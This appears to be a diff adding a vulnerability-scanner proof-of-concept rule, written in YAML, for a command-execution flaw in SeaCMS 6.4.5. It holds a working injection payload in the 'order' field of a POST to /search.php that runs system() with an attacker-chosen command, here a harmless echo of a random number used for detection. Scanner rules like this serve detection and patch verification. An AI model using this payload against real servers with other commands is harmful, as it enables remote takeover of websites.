@@ -1,0 +1,13 @@
+name: poc-yaml-seacms_v6.4.5-command-exec
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: POST
+    path: /search.php?searchtype=5
+    body: searchtype=5&order=}{end if}{if:1)$_POST[func]($_POST[cmd]);if(1}{end if}&func=system&cmd=echo ({{rand}})
+    expression: |
+      response.body.bcontains(bytes(string(rand)))
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links:
+    - https://www.cnblogs.com/ffx1/p/12653597.html
